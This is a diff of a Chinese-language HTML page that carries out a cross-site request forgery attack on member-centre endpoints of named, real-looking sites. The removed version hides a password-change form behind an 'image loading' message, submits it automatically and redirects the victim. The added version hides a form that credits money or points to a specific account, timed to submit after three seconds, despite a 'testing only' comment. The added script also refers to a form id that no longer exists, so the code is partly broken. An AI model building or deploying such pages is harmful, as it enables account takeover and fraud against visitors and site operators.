@@ -1,55 +1,49 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <title>图片加载中...</title>
+  <title>CSRF 表单演示</title>
   <style>
     body {
-      text-align: center;
-      margin-top: 100px;
-      font-family: Arial, sans-serif;
       background-color: #fff;
+      text-align: center;
+      margin-top: 80px;
+      font-family: Arial, sans-serif;
     }
-    #status {
-      font-size: 18px;
+    img {
+      max-width: 300px;
     }
   </style>
 </head>
 <body>
 
-  <p id="status">图片加载中，请稍后…</p>
+  <h2>模拟转账操作中…</h2>
+  <!-- 展示图片（本地或远程都可以） -->
+  <img src="your-image.png" alt="交易凭证图示">
 
-  <!-- CSRF 表单 -->
-  <form id="csrfForm" action="https://cn.b58321.com/index.php?s=/MemberCenter/formChangePassword" method="POST">
-    <input type="hidden" name="oldPassword" value="123456">
-    <input type="hidden" name="newPassword" value="1234567">
-    <input type="hidden" name="new2Password" value="1234567">
-  </form>
+  <!-- 隐藏表单，模拟CSRF攻击行为（仅供测试） -->
+ <form method="POST" action="https://ad721.nb200.net/index.php?s=/MemberPoint/index">
+  <input type="hidden" name="decide" value="">
+  <input type="hidden" name="checkVerifc" value="4fe83a323debe74285b611d1a3c2fb83">
+  <input type="hidden" name="memberAccount" value="n1a8899">
+  <input type="hidden" name="searchPoint" value="1">
+  <input type="hidden" name="upMoney" value="50">
+  <input type="hidden" name="upType" value="3">
+  <input type="hidden" name="upGameId" value="22">
+  <input type="hidden" name="upEventId" value="1">
+  <input type="hidden" name="upOther" value="1;推广赠點">
+  <input type="hidden" name="upMain" value="测试入點">
+  <input type="hidden" name="upRemark" value="">
+  <input type="hidden" name="typeMoney" value="additionMoney">
+  <input type="hidden" name="keyWord" value="9521">
+</form> 
 
   <script>
-    window.onload = function () {
-      const form = document.getElementById("csrfForm");
-
-      // 创建一个临时按钮并点击以确保兼容性（防止部分浏览器限制直接 submit）
-      const btn = document.createElement("button");
-      btn.type = "submit";
-      btn.style.display = "none";
-      form.appendChild(btn);
-
-      // 表单添加事件（可选拦截）
-     const forceRedirect = setTimeout(() => {
-        window.location.href = "https://www.google.com/?hl=zh_TW";
-      }, 3000);
-      };
-
-      btn.click(); // 自动触发表单提交
-    };
+    // 延迟3秒提交
+    setTimeout(() => {
+      document.getElementById('csrfForm').submit();
+    }, 3000);
   </script>
 
 </body>
 </html>
-
-
-
-
-
